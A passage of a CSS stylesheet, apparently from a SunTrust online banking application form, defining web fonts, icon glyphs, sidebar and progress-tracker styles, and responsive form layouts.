    src: url('../fonts/fs_albert-bolditalic-webfont.eot?#iefix') format('embedded-opentype'), url('../fonts/fs_albert-bolditalic-webfont.woff') format('woff'), url('../fonts/fs_albert-bolditalic-webfont.ttf') format('truetype'), url('../fonts/fs_albert-bolditalic-webfont.svg#suntrustregular') format('svg');
    font-weight: 700;
    font-style: italic;
}

/*
@font-face {
	font-family: 'suntrustregular';
	src: url('../fonts/fs_albert-thin.eot');
	src: url('../fonts/fs_albert-thin.eot?#iefix') format('embedded-opentype'), url('../fonts/fs_albert-thin.woff') format('woff'), url('../fonts/fs_albert-thin.ttf') format('truetype'), url('../fonts/fs_albert-thin.svg#suntrustregular') format('svg');
	font-weight: 100;
	font-style: normal;
}
*/

@font-face {
    font-family: 'suntrustregular';
    src: url('../fonts/fs_albert-italic-webfont.eot');
    src: url('../fonts/fs_albert-italic-webfont.eot?#iefix') format('embedded-opentype'), url('../fonts/fs_albert-italic-webfont.woff') format('woff'), url('../fonts/fs_albert-italic-webfont.ttf') format('truetype'), url('../fonts/fs_albert-italic-webfont.svg#suntrustregular') format('svg');
    font-weight: normal;
    font-style: italic;
}

/* font icons - OLB */

@font-face {
    font-family: 'olb-icons';
    font-style: normal;
    font-weight: normal;
    src: url("../fonts/suntrust-icons-7.eot");
    src: url("../fonts/suntrust-icons-7.eot?#iefix") format('embedded-opentype'), url("../fonts/suntrust-icons-7.woff") format('woff'), url("../fonts/suntrust-icons-7.ttf") format('truetype'), url("../fonts/suntrust-icons-7.svg") format('svg');
}

@font-face {
    font-family: 'suntrustregular';
    src: url('../fonts/fs_albert-webfont.eot');
    src: url('../fonts/fs_albert-webfont.eot?#iefix') format('embedded-opentype'), url('../fonts/fs_albert-webfont.woff') format('woff'), url('../fonts/fs_albert-webfont.ttf') format('truetype'), url('../fonts/fs_albert-webfont.svg#suntrustregular') format('svg');
    font-weight: normal;
    font-style: normal;
}

@font-face {
    font-family: 'suntrustregular';
    src: url('../fonts/fs_albert-bold-webfont.eot');
    src: url('../fonts/fs_albert-bold-webfont.eot?#iefix') format('embedded-opentype'), url('../fonts/fs_albert-bold-webfont.woff') format('woff'), url('../fonts/fs_albert-bold-webfont.ttf') format('truetype'), url('../fonts/fs_albert-bold-webfont.svg#suntrustregular') format('svg');
    font-weight: 700;
    font-style: normal;
}

@font-face {
    font-family: 'suntrustregular';
    src: url('../fonts/fs_albert-bolditalic-webfont.eot');
    src: url('../fonts/fs_albert-bolditalic-webfont.eot?#iefix') format('embedded-opentype'), url('../fonts/fs_albert-bolditalic-webfont.woff') format('woff'), url('../fonts/fs_albert-bolditalic-webfont.ttf') format('truetype'), url('../fonts/fs_albert-bolditalic-webfont.svg#suntrustregular') format('svg');
    font-weight: 700;
    font-style: italic;
}

/*
@font-face {
	font-family: 'suntrustregular';
	src: url('../fonts/fs_albert-thin.eot');
	src: url('../fonts/fs_albert-thin.eot?#iefix') format('embedded-opentype'), url('../fonts/fs_albert-thin.woff') format('woff'), url('../fonts/fs_albert-thin.ttf') format('truetype'), url('../fonts/fs_albert-thin.svg#suntrustregular') format('svg');
	font-weight: 100;
	font-style: normal;
}
*/

@font-face {
    font-family: 'suntrustregular';
    src: url('../fonts/fs_albert-italic-webfont.eot');
    src: url('../fonts/fs_albert-italic-webfont.eot?#iefix') format('embedded-opentype'), url('../fonts/fs_albert-italic-webfont.woff') format('woff'), url('../fonts/fs_albert-italic-webfont.ttf') format('truetype'), url('../fonts/fs_albert-italic-webfont.svg#suntrustregular') format('svg');
    font-weight: normal;
    font-style: italic;
}


/* font icons - suntrust.com */
@font-face {
    font-family: "sun-icons";
    src: url("../fonts/sun-icons-a4.eot");
    src: url("../fonts/sun-icons-a4.eot?#iefix") format("embedded-opentype"), url("../fonts/sun-icons-a4.woff") format("woff"), url("../fonts/sun-icons-a4.ttf") format("truetype"), url("../fonts/sun-icons-a4.svg?#sun-icons") format("svg");
    font-weight: normal;
    font-style: normal;
}


.sti-icon:before {
    background-clip: padding-box;
    border-radius: 30px;
    border-style: solid;
    border-width: 1px;
    display: inline-block;
    font-size: 14px;
    height: 30px;
    line-height: 30px;
    margin: 0 10px 7px 0;
    text-align: center;
    vertical-align: middle;
    width: 30px;
    color: #aaa;
}

.icon-call:before {
    font-family: "sun-icons";
    display: inline-block;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    content: "\f114";
    text-indent: 1px;
}

.icon-email:before {
    font-family: "sun-icons";
    display: inline-block;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    content: "\f110";
    line-height: 36px;
}

.icon-chat:before {
    font-family: "sun-icons";
    display: inline-block;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    content: "\f119";
}

.icon-privacy:before {
    font-family: "sun-icons";
    display: inline-block;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    content: "\f10e";
}

.icon-save:before {
    font-family: "olb-icons";
    display: inline-block;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    content: "\e01e";
}

.icon-retrieve:before {
    font-family: "olb-icons";
    display: inline-block;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    content: "\e02f";
}

/* disabled style deactivates the link */
.sti-icon.disabled {
    opacity: .33;
    pointer-events: none;
    cursor: default;
}

.content-copy {
    padding: 0 10px;
}

.sub-content-copy {
    padding: 0 20px;
}

.footer-icon:before {
    display: inline-block;
    font-size: 14px;
    height: 14px;
    margin: 0 5px 0 4px;
    width: 15px;
    color: #999;
}

.icon-privacy-footer:before {
    font-family: "sun-icons";
    display: inline-block;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    content: "\f10e";
}

.img-width {
    width: 50%;
}

.cc-offer-ul {
    margin-bottom: -10px;
    margin-top: -10px;
}

.linebreak-label {
    display: none;
}

.switch-section .label-inline {
    display: inline-block;
}

.accept-tick {
    display: inline-block;
    float: right;
    padding: 10px;
}


    .accept-tick:before {
        content: "?";
        color: #339900;
        font-family: 'ZapfDingbatsITC', 'Zapf Dingbats';
    }

    .accept-tick:after {
        content: " Accepted";
        color: #339900;
        font-family: 'TrebuchetMS', 'Trebuchet MS';
        clear: both;
    }

.switch-section .input-control-custom {
    display: inline-block;
    width: auto;
    float: right;
}

.img-width {
    width: 50%;
}

@media (min-width: 800px) and (max-width: 1024px) {
    .percent-icon {
        left: 130px !important;
    }
}

/* ****************************************************************************************** */
/* ***********************   DESIGN EDITS FOR ANYTHING BELOW 1024px   *********************** */
/* ****************************************************************************************** */

@media (max-width: 1024px) {

    html, body {
    }

    .bootstrap .field-icon a {
        position: relative;
        z-index: 1;
        font-family: suntrustregular;
        color: #005EAD;
        font-size: 12px;
        /*position: absolute;*/
        float: right;
        right: 30px;
        bottom: 30px;
    }
    /*Chandra Start - 6/14 */
    .bootstrap {
        color: rgb(51, 51, 51);
        font-family: "suntrustregular","Trebuchet MS",sans-serif;
        font-size: 1.5rem;
        font-weight: normal;
        line-height: 2rem;
        margin: 0;
        border-top: 0px solid #fff;
    }


    .clickable-div {
        cursor: pointer;
    }

    .bootstrap .row-spacing {
        margin-top: 30px;
    }

    .print {
        display: inline-block;
        position: relative;
        margin: 2.8em 0 .5em 0;
        background: url(../images/Print_Icon.svg) no-repeat;
        background-size: 20px 20px;
    }

    .bootstrap .confirmationfields .field {
        font-family: suntrustregular;
        font-weight: bold;
        font-size: 12px;
        color: #333333;
    }

    .bootstrap .confirmationfields .value {
        font-family: suntrustregular;
        font-size: 14px;
        color: #333333;
    }

    .bootstrap .confirmationfields .note-text {
        margin-top: 11px;
        color: #333333;
        font-size: 12px;
        font-weight: normal;
        line-height: normal;
    }
    /* chandra - 6/14 End */
    .sub-label {
        color: #C94C06; /* was #ccc - darkened for WCAG AA compliance */
        font-size: 14px;
        font-weight: normal;
        line-height: normal;
    }

    .input-label {
        display: inline-block;
        font-weight: bold;
        text-align: left;
        width: 100%;
        padding-top: 11px;
        vertical-align: top;
    }

    .review-value {
        font-size: 20px;
        padding-top: 0px;
        font-weight: normal;
        line-height: 22px;
        max-width:  320px;
        word-wrap:  break-word;
    }
    /*****Chandra End******/
    .page {
        width: 100%;
        margin-top: 0;
    }

    .main-content.no-progress {
        /* border:0; */
    }

    .content-copy {
    }

    .sub-content-copy {
    }

    .mobile-only-content {
        display: block;
    }

    .pdf-content {
        margin-bottom: 2.5em;
    }

    /* footer-arc specs */

    .right-rounded-footer {
        display: none;
    }

    .left-rounded-footer {
        background-image: url("../images/left-and-right-arc.png");
        background-position: left bottom;
        background-size: contain;
        bottom: 0;
        width: 100%;
    }


    /* Mobile App Download widget dispay on non-desktop resolutions */

    .dl-app {
        display: inline-block;
    }



    /* sidebar flyout for smaller screens */

    div.menu-link {
        display: inline-block;
        position: absolute;
        top: 37px;
        right: 25px;
    }

        div.menu-link:before {
            font-family: "olb-icons";
            font-weight: normal;
            font-style: normal;
            text-decoration: inherit;
            content: "\e038";
            font-size: 20px;
            color: #aaa;
            border: 2px solid #aaa;
            border-radius: 50%;
            padding: 12px 10px 7px 10px;
        }

        div.menu-link.active {
            display: none;
        }

    div.close-link {
        display: inline-block;
        color: #fff;
        position: relative;
        left: 152px;
        top: 15px;
    }

    .sidebar {
        z-index: 1000000000;
    }

    .sidebar-content {
        padding: 0;
        border: 0;
        width: 210px;
        margin-top: 2em;
    }

    .sidebar-container {
        -webkit-transition: all 0.3s ease-out;
        -moz-transition: all 0.3s ease-out;
        -ms-transition: all 0.3s ease-out;
        -o-transition: all 0.3s ease-out;
        transition: all 0.3s ease-out;
    }

    .sidebar-container {
        background-color: rgb(13, 54, 90);
        color: #fff;
        padding: 1em;
        clear: both;
        width: 1000px;
        height: 100%;
        position: fixed;
        top: 0px;
        margin: 0;
        border: 0;
        right: -1245px;
        z-index: 1000000000;
        opacity: 0.98;
        filter: alpha(opacity=98);
    }

        .sidebar-container.active {
            right: -775px;
            box-shadow: -4px 3px 3px rgba(0, 0, 0, 0.06);
        }

        .sidebar-container h3 {
            color: #fff;
        }

        .sidebar-container ul {
            padding: 0;
            margin: 0 0 3em .5em;
        }

            .sidebar-container ul.selections {
                padding: 0;
                margin: 0 0 3em .5em;
            }

                .sidebar-container ul.selections .icon-checkmark:before {
                    margin-right: 1em;
                    margin-left: .5em;
                    float: left;
                }

                .sidebar-container ul.selections li {
                    padding-left: 41px;
                }

                    .sidebar-container ul.selections li:before {
                        color: rgb(173, 201, 232);
                        padding-left: 0;
                    }


            .sidebar-container ul.questions a:link, .sidebar ul.questions a:hover, .sidebar ul.questions a:visited, .sidebar ul.questions a:active,
            .sidebar-container ul.save-retrieve a:link, .sidebar ul.save-retrieve a:hover, .sidebar ul.save-retrieve a:visited, .sidebar ul.save-retrieve a:active {
                text-decoration: none;
                color: rgb(173, 201, 232);
            }

            .sidebar-container ul.questions a:hover, .sidebar-container ul.save-retrieve a:hover {
                text-decoration: none;
                color: #fff;
            }

            .sidebar-container ul.selections.finished li:before {
                color: rgb(173, 201, 232);
            }

    .sti-icon:link:before, .sti-icon:active:before, .sti-icon:visited:before {
        color: rgb(173, 201, 232);
    }

    .sidebar-container ul.status li.complete:before {
        color: rgb(173, 201, 232);
    }

    li#chat-link {
        display: none;
    }

    select,
    input[type=text],
    input[type=email],
    input[type=url],
    input[type=password],
    input[type=color],
    input[type=date],
    input[type=datetime],
    input[type=datetime-local],
    input[type=email],
    input[type=month],
    input[type=number],
    input[type=range],
    input[type=search],
    input[type=tel],
    input[type=time],
    input[type=url],
    input[type=week],
    textarea {
        /* max-width: 250px;*/
    }

    .select-combo select {
        max-width: 125px;
    }

    .combo-container {
        max-width: 250px;
    }

    .segmented .label {
        max-width: 83px; /* changed from 81px to fit better */
    }
}

@media (min-width: 767px) and (max-width: 940px) {
    .bootstrap .field-icon a {
        position: relative;
        z-index: 1;
        font-family: suntrustregular;
        color: #005EAD;
        font-size: 12px;
        /* position: absolute; */
        float: right;
        right: 15px;
        bottom: 30px;
    }
}

@media (min-width: 650px) and (max-width: 767px) {
    .promo-sidebar {
        position: absolute !important;
        top: 55px;
        padding-top: 20px;
    }

    .promo-toggle-section {
        padding-bottom: 100px;
    }
}

@media (max-width: 767px) {

    html, body {
    }

    .clickable-div {
        cursor: pointer;
    }

    .bootstrap .field-icon a {
        position: relative;
        z-index: 1;
        font-family: suntrustregular;
        color: #005EAD;
        font-size: 12px;
        /*position: absolute;*/
        float: right;
        right: 15px;
        bottom: 30px;
    }

    .LoginModal .bootstrap .field-icon a {
        position: relative;
        z-index: 1;
        font-family: suntrustregular;
        color: #005EAD;
        font-size: 12px;
        /*position: absolute;*/
        float: right;
        right: 20px;
        top: 30px;
    }

    .Additionalowners-label {
        font-size: 20px;
    }

    .owners-list {
        display: block;
    }

    .Additionalowners-checklist-label {
        font-size: 15px !important;
    }

    .owners-list .checkbox input[type="checkbox"] + label {
        font-size: 15px !important;
    }

    .Additionalowners-email-text {
        font-size: 12px;
    }
    /*.Additionalowners-email {
    width:80% !important;
    }
    .Additionalowners-percent {
    width:15% !important;
    }*/
    .mobile-show {
        display: block !important;
    }

    .mobile-hide {
        display: none !important;
    }

    .mobile-show .hrMiddle {
        margin: 25px 0;
    }

    .Additionalowners {
        padding-top: 30px;
        padding-left: 20px;
        padding-right: 20px;
        padding-bottom: 30px;
    }




    /*Chandra Start - 6/14 */
    .bootstrap {
        color: rgb(51, 51, 51);
        font-family: "suntrustregular","Trebuchet MS",sans-serif;
        font-size: 1.5rem;
        font-weight: normal;
        line-height: 2rem;
        margin: 0;
        border-top: 0px solid #fff;
    }

        .bootstrap .row-spacing {
            margin-top: 0px;
        }


    /*.promo-header{
    margin-bottom: 85px !important;
}*/
    .promo-link {
        font-size: 15px;
    }

    .promo-details {
        margin-bottom: 0px !important;
        font-size: 20px !important;
    }

    .remove-promo {
        width: 10px;
        height: 10px;
        position: relative;
        top: -4px;
    }

    .print {
        display: inline-block;
        position: relative;
        margin: 2.8em 0 .5em 0;
        background: url(../images/Print_Icon.svg) no-repeat;
        background-size: 20px 20px;
    }

    .bootstrap .confirmationfields .field {
        font-family: suntrustregular;
        font-weight: bold;
        font-size: 12px;
        color: #333333;
        margin-top: 10px;
    }

    .bootstrap .confirmationfields .value {
        font-family: suntrustregular;
        font-size: 14px;
        color: #333333;
    }

    .bootstrap .confirmationfields .note-text {
        margin-top: 11px;
        color: #333333;
        font-size: 12px;
        font-weight: normal;
        line-height: normal;
    }

    .suntrust-login-heading {
        font-size: 25px;
    }

    .LoginModal .modal-content {
        width: 290px;
    }

    .suntrust-login-heading-sublabel {
        font-size: 15px;
    }

    .percent-icon {
        left: 100px !important;
    }
}



/* ****************************************************************************************** */
/* ***********************   DESIGN EDITS FOR ANYTHING BELOW 650px   *********************** */
/* ****************************************************************************************** */

@media (max-width: 650px) {

    html, body {
    }

    .clickable-div {
        cursor: pointer;
    }

    .button-offers {
        display: block;
    }

    .ad-row.card-offer {
        margin-top: 0;
        margin-bottom: -40px;
    }

    .percent-icon {
        left: 90px !important;
    }

    .page {
    }
    /* chandra - 6/14 Start */
    .bootstrap {
        color: rgb(51, 51, 51);
        font-family: "suntrustregular","Trebuchet MS",sans-serif;
        font-size: 1.5rem;
        font-weight: normal;
        line-height: 2rem;
        margin: 0;
        border-top: 0px solid #fff;
    }

        .bootstrap .row-spacing {
            margin-top: 0px;
        }

    .print {
        display: inline-block;
        position: relative;
        margin: 2.8em 0 .5em 0;
        background: url(../images/Print_Icon.svg) no-repeat;
        background-size: 20px 20px;
    }

    .bootstrap .confirmationfields .field {
        font-family: suntrustregular;
        font-weight: bold;
        font-size: 12px;
        color: #333333;
        margin-top: 10px;
    }

    .bootstrap .confirmationfields .value {
        font-family: suntrustregular;
        font-size: 14px;
        color: #333333;
    }

    .bootstrap .confirmationfields .note-text {
        margin-top: 11px;
        color: #333333;
        font-size: 12px;
        font-weight: normal;
        line-height: normal;
    }
    /* chandra - 6/14 End */
    .main-content.no-progress {
        border: 0;
    }

    .header-container {
        padding: 15px 10px;
        transition: all 0s ease 0s;
        box-shadow: none;
    }

        .header-container .header-logo-container {
            text-align: left;
        }


    header .header-logo {
        display: block;
        -moz-box-sizing: border-box;
        box-sizing: border-box;
        background: url(../images/suntrust-logo-white.svg) no-repeat;
        width: 140px;
        /* Width of new image */
        height: 30px;
        /* Height of new image */
        /* Equal to width of new image */
        margin-left: auto;
        margin-right: auto;
    }

    .header-container .header-logo-container .header-card-benefits {
        position: absolute;
        float: left;
        color: white;
        cursor: pointer;
        font-size: 12px;
        padding: 8px;
        background: #E6772C 0% 0% no-repeat padding-box;
        border-radius: 4px;
        opacity: 1;
    
}

.arrow {
    display: none;
}

.arrow-down {
    transform: rotate(180deg);
}

.card-benefits-content {
    position: absolute;
    z-index: 3;
    background-color: white;
    width: 100%;
}

    .card-benefits-content > div {
        margin-right: auto;
        margin-left: auto;
        max-width: 1000px;
        padding: 20px;
        box-shadow: 0px 3px 6px rgba(0, 0, 0, 0.16);
    }

        .card-benefits-content > div > .card-benefits-header {
            /*width: 266px;*/
            height: 21px;
            font-size: 18px;
            color: #EE611F;
        }

        .card-benefits-content > div > .card-benefits-data {
            font-size: 12px;
            color: #333333;
        }

.card-benefits-data > p {
    padding-top: 20px;
    margin-left: 0px;
    padding-bottom: 20px;
    clear: both;
}

.card-benefits-data > ul > li {
    float: none;
    width: 100%;
    margin-left: 0;
}

.card-benefits-close {
    color: #005EAD;
    cursor: pointer;
    font-size: 15px;
    position: absolute;
    bottom: 5%;
    width: 34px;
    left: calc(50% - 17px);
}

.card-benefits-close-img {
    display: none;
}
    .citizenship-multiselect {
        width: calc(100% - 36px)!important;
    }

h3.question {
    padding: 10px;
    border-radius: 4px;
    margin: 2em 0 1em 0;
    border: 0;
    color: #333;
    background: #f4f4f4;
}


h3.legend, h3.legend.next-steps {
    padding: 2px 10px;
    border-radius: 4px;
    margin: 2em 0 1em 0;
    border: 0;
    color: #fff;
    letter-spacing: normal;
    font-size: 1em;
    font-weight: bold;
    background-color: #C94C06; /* -- dark orange, compliant w/ ADA */
    /* background-color: rgb(248, 161, 49); -- brand orange, non compliant w/ ADA */
}

    h3.legend + .switch-section {
        margin-top: 1em;
    }

    h3.legend + .content-copy {
        margin-top: 0;
    }


.Additionalowners-label {
    font-size: 20px;
}

.owners-list {
    display: block;
}

.Additionalowners-checklist-label {
    font-size: 15px !important;
}

.owners-list .checkbox input[type="checkbox"] + label {
    font-size: 15px !important;
}

.Additionalowners-email-text {
    font-size: 12px;
}

.Additionalowners-email {
    width: 80% !important;
}

.Additionalowners-percent {
    width: 30% !important;
}

.owners-list .checkbox input[type="checkbox"] + label:before {
    left: 0px !important;
}


.web_dialog {
    display: none;
    position: fixed;
    width: 80%;
    height: auto;
    top: 25%;
    left: 50%;
    margin-left: -40%;
    margin-top: -100px;
    background-color: #fff;
    border: 3px solid #fff;
    border-radius: 4px;
    padding: 20px;
    z-index: 9999999999102;
}

.offer-card > .row > .col-md-6:first-child {
    padding-bottom: 30px;
}

.offer-card .card-body {
    padding-left: 24px !important;
}

.offer-card .card-pdf {
    padding-left: 24px !important;
}

.offer-card .checkbox input[type="checkbox"] + label:before {
    left: 24px !important;
}

.offer-card .checkbox input[type="checkbox"] + label {
    padding-left: 20px;
    font-size: 15px;
}

.offer-card .promo-header {
    font-size: 20px;
}

.offer-card .checkbox input[type="checkbox"] {
    top: 8px;
    left: 10px;
    position: relative;
}

.promo-toggle-section {
    padding-bottom: 100px;
}

.promo-sidebar {
    position: absolute !important;
    top: 55px;
    padding-top: 20px;
}
/* hide tutorial from smaller screens */

.tutorial {
    display: none !important;
}


.main-container {
    /*    padding-top:55px;  TESTING */
}



/* Reset progress tracker styles */
.progress-tracker {
    list-style: none;
    margin: 0;
    padding: 0;
    white-space: inherit;
    display: inline;
    width: auto;
}

    .progress-tracker > .item {
        display: inline;
        position: inherit;
        padding: 0;
        color: #707070;
        background: none;
        display: inline;
    }

        .progress-tracker > .item > p {
            display: none;
        }

        .progress-tracker > .item:after, .progress-tracker > .item:before {
            border: 0;
        }

        .progress-tracker > .item:first-child, .progress-tracker > .item:last-child {
            padding: 0;
        }

        .progress-tracker > .item.active {
            color: #ee6120;
            background: none;
        }

/* Make new progress tracker styles */

.progress-tracker-container {
    text-align: center;
    margin: 1em 0 0 0;
}

.progress-tracker > .item:before, .progress-tracker > .item:first-child:before {
    content: "";
    position: inherit;
    display: inline-block;
    border: 1px solid #ccc;
    background: #fff;
    color: #aaa;
    font-size: 2rem;
    font-weight: 700;
    padding: 5px 10px;
    margin: 0 2px;
    border-radius: 50%;
}

.progress-tracker > .item.active:before {
    border-color: #d66112;
    background-color: #d66112; /* -- dark orange, compliant w/ ADA */
    /* background-color: rgb(248, 161, 49); -- brand orange, non compliant w/ ADA */
    color: #fff;
}

.progress-tracker > .item:first-child:before {
    content: "1";
}

.progress-tracker > .item:nth-child(2):before {
    content: "2";
}

.progress-tracker > .item:nth-child(3):before {
    content: "3";
}

.progress-tracker > .item:nth-child(4):before {
    content: "4";
}

.progress-tracker > .item:nth-child(5):before {
    content: "5";
}

.progress-tracker > .item:nth-child(6):before {
    content: "6";
}

.progress-tracker > .item:nth-child(7):before {
    content: "7";
}


div.menu-link {
    top: 20px;
    right: 15px;
}

    div.menu-link:before {
        font-size: 1.4rem;
        color: #fff;
        border: 2px solid #fff;
    }

div.close-link {
    left: 165px;
    top: 0;
}

div.sidebar-content {
    margin-top: 0;
}

/* Segmented control on Getting Started page */


.segmented .label {
    width: 33.333%;
    max-width: none;
}

.segmented.business .label {
    width: 50%;
    max-width: none;
}

.input-control.forgot-useridpw {
    padding: 0;
    left: 10px;
    margin-bottom: 20px;
}


.offer-box {
    padding: 15px 10px;
    margin: 25px -10px 15px -10px;
    border: 0px solid #eee;
}

/*
.offer-box-copy:before {
    content: "\25BA";
    color:#ccc;
    font-size: 100%;
    display: inline-block;
    pointer-events: none;
    padding:0 10px 0 0;
   
}
*/

.promocode-trigger {
    left: 10px;
}

#delete-field {
    left: -71px;
}

#df-control {
}


.forgot-link a {
    display: inline-block;
    float: right;
    margin-right: 36px;
}

#client-yesno .radio-combos {
    top: 0;
}

#client-yesno .input-error {
    left: 5px;
}

.inline-radio .error-message {
    width: 100%;
}

.input-row.inline-radio .input-control .radio-combos {
    font-size: 16px; /* tweak font size to circumvent iPhone auto-zoom */
    padding: 0px 10px 0px 10px;
    width: 85%;
    width: -moz-calc(100% - 36px);
    width: -webkit-calc(100% - 36px);
    width: calc(100% - 36px);
    max-width: none;
}

.input-row.inline-radio .input-label, .input-row.inline-radio .input-control {
    /* margin-left:5px; */
}

    .input-row.inline-radio .input-label .sub-label {
        display: block;
        /*padding-left:10px;*/
    }


/* Disclosures PDF list */

.pdf-content {
    margin-bottom: 0;
}


.disclosure-pdf {
    float: none;
    width: 100%;
    margin-top: 10px;
}

.pdf-note {
    float: none;
    width: 100%;
    background: none;
    padding: 20px 0 0 0;
}

.disclosure-pdf ul {
    float: none;
    width: 100%;
}

.ad-row {
    display: auto;
    margin: 0;
    border-spacing: auto;
}

.ad-container {
    display: table;
    padding: 0 10px;
    border-radius: 4px;
    width: 100%;
    margin: 3em 0;
}


.two-ads .ad-container, .three-ads .ad-container, .four-ads .ad-container {
    width: 100%;
}

.ad-row.one-ad {
    display: table;
}

.one-ad .ad-container {
    display: table-cell;
    width: 100%;
    max-width: none;
    margin: 3em 0;
    padding: 20px;
}

.ad-body, .three-ads .ad-body, .four-ads .ad-body, .medium-ads .ad-body, .short-ads .ad-body {
    min-height: 10px !important;
}


/* 2B (double display) */


.dub-row {
    display: block;
}

.dub-container {
    display: block;
    width: 100%;
    margin: 1em 0;
}


/* variations for credit card offers */

.card-offer .ad-container {
    margin: 0 0 3em 0;
}

.card-offer .ad-body {
    min-height: 10px;
    margin-bottom: 40px;
}

.card-offer .ad-button .button-offer {
    padding: 17px 24px;
    font-size: 18px;
}



/* title-button-edit styles */


.title-button-edit {
    top: -3px;
    right: -3px;
}


    .title-button-edit .delete-button, .title-button-edit .delete-button:link, .title-button-edit .delete-button:active, .title-button-edit .delete-button:visited {
        /* padding: 7px 24px; */
        color: #fff;
        background-color: rgb(248, 161, 49);
        border-color: #fff;
    }

        .title-button-edit .outline-button:hover,
        .title-button-edit .delete-button:hover,
        .title-button-edit .edit-button:hover {
            -webkit-transition: border 0.15s ease-in;
            transition: border 0.15 ease-in;
            cursor: pointer;
            text-decoration: none;
            color: #fff;
            border-color: #fff;
            background: #ee6120;
        }

        .title-button-edit .delete-button:before {
            color: #fff;
        }

        .title-button-edit .delete-button:hover:before {
            color: #fff;
        }

/* style the values in locked down input rows to look like disabled fields */
.input-row.locked .disabled-field-value {
    width: -moz-calc(100% - 36px);
    width: -webkit-calc(100% - 36px);
    width: calc(100% - 36px);
    max-width: none;
    /*
    background:#fff;
    color:#999;
    border: 1px solid #ccc;
    */
}




select,
input[type=text],
input[type=email],
input[type=url],
input[type=password],
input[type=color],
input[type=date],
input[type=datetime],
input[type=datetime-local],
input[type=email],
input[type=month],
input[type=number],
input[type=range],
input[type=search],
input[type=tel],
input[type=time],
input[type=url],
input[type=week],
textarea {
    font-size: 16px; /* tweak font size to circumvent iPhone auto-zoom */
    padding: 0px 10px 0px 10px;
    width: 85%;
    width: -moz-calc(100% - 36px);
    width: -webkit-calc(100% - 36px);
    width: calc(100% - 36px);
    max-width: none;
}

    select, select:focus {
        -webkit-appearance: none;
        -moz-appearance: none;
        text-indent: 0.01px;
        text-overflow: '';
        background: url("../images/inputbg-select.png") no-repeat scroll right center rgba(0, 0, 0, 0) !important;
        background-position: 100% 50%;
        padding-left: 5px;
    }

.select-combo select {
    width: 42.5%;
    width: -moz-calc(50% - 18px);
    width: -webkit-calc(50% - 18px);
    width: calc(50% - 18px);
    max-width: none;
}

.combo-container {
    width: 85%;
    width: -moz-calc(100% - 36px);
    width: -webkit-calc(100% - 36px);
    width: calc(100% - 36px);
    max-width: none;
}


.input-control, .input-text {
    display: block;
    width: 100%;
}

.input-photo {
    padding-left: 10px;
}


.input-row.special .input-control {
    display: block;
    width: 100%;
}

.input-text {
    margin-left: 10px;
    padding-left: 0;
}


.input-row .input-label {
    display: block;
    text-align: left;
    width: 100%;
    font-weight: 700;
    padding-right: 0;
    padding-left: 10px;
}

    .input-row .input-label.empty {
        display: none;
    }

.input-row.checkbox-row .input-label.group-label {
    width: 85%;
    width: -moz-calc(100% - 50px);
    width: -webkit-calc(100% - 50px);
    width: calc(100% - 50px);
    margin: 10px 10px 5px 10px;
    padding: 0 20px 5px 0;
    border-bottom: 0px solid #ddd;
}

.numbered-instructions .input-control, .numbered-instructions .input-text {
    width: auto;
}

.numbered-instructions .input-row .input-label {
    width: auto;
}

.input-row .input-label .sub-label {
    display: inline;
}


.input-row.hasError .input-error:after {
    display: inline-block;
    font-family: "olb-icons";
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    content: "\e003";
    color: #ff3300;
    font-size: 25px;
}

.input-row.hasError .error-message {
    margin-left: 10px;
}

.sub-text-row, .text-row {
    margin: 5px 10px 5px 5px;
}

.input-control .sub-text#instructions {
    width: auto;
}

.switch-section .sub-label, .switch-section .sub-label-regular {
    margin-right: 0;
}

.radio-row .input-control, .checkbox-row .input-control, .checkbox-toggle-row .input-control {
    padding-top: 10px;
}

.checkbox-row .input-control {
    padding-left: 10px;
}

input[type=text].perc-full {
    width: 60%;
    width: -moz-calc(100% - 36px);
    width: -webkit-calc(100% - 36px);
    width: calc(100% - 36px);
    max-width: none;
}

.content-copy {
}

.sub-content-copy {
}


.button-row {
    text-align: center;
    padding: 2em 0;
}

    .button-row.align-center {
        padding: 0em;
    }

    .button-row .button-primary, .button-row button {
        width: 100%;
        padding: 24px 24px;
        margin: 0.75em 0;
        float: left;
        font-size: 20px;
    }

    .button-row .button-secondary {
        width: 100%;
        padding: 24px 24px;
        margin: 0.75em 0;
        float: right;
        font-size: 20px;
    }

    .button-row .button-tertiary {
        margin: 0.75em 0;
        top: 0;
        font-size: 20px;
        line-height: 20px;
    }

    .button-row .button-link {
        margin: 0.75em 0;
        top: 0;
        font-size: 20px;
        line-height: 20px;
    }



.more-options {
    margin: 1em;
}

/* Funding box widget styles */

.funding-box {
    background: #f3f3f3;
    border-radius: 4px;
    margin: 0 0 2em 0;
    padding: 10px;
}



.tooltipster-default {
    max-width: 75%;
}



/* cloned input styles */
#input_w2, #input_w3, #input_w4, #input_w5, #input_w6, #input_w7, #input_w8, #input_w9, #input_w10,
#input_x2, #input_x3, #input_x4, #input_x5, #input_x6, #input_x7, #input_x8, #input_x9, #input_x10,
#input_y2, #input_y3, #input_y4, #input_y5, #input_y6, #input_y7, #input_y8, #input_y9, #input_y10,
#input_z2, #input_z3, #input_z4, #input_z5, #input_z6, #input_z7, #input_z8, #input_z9, #input_z10 {
    /* background-color: rgb(244, 244, 244); */
    background-color: #fff;
    border-top: 10px solid #eee;
    margin-top: 1em;
}



/* Teammate URL - App Launcher styles */

.app-launch h3.legend + .input-row {
    border-top: 0;
}

.app-launch .input-row {
    display: table;
    width: 100%;
    border-top: 1px solid #eee;
    margin: 0;
    padding: 0;
}

    .app-launch .input-row .input-text {
        display: table-cell;
        width: 49%;
        text-align: center;
        height: 60px;
        vertical-align: middle;
        padding: 5px 0 5px 5px;
    }

    .app-launch .input-row .input-label {
        display: table-cell;
        width: 49%;
        text-align: left;
        height: 60px;
        vertical-align: middle;
        padding: 5px 5px 5px 10px;
    }


/* -- edit rate-table styles for vertical layout - */

.rate-table table, .rate-table thead, .rate-table tbody, .rate-table th, .rate-table td, .rate-table tr {
    display: block !important;
    width: 100%;
}

    .rate-table thead tr {
        position: absolute;
        top: -9999px;
        left: -9999px;
    }

.rate-table tr {
    border: 1px solid #ddd;
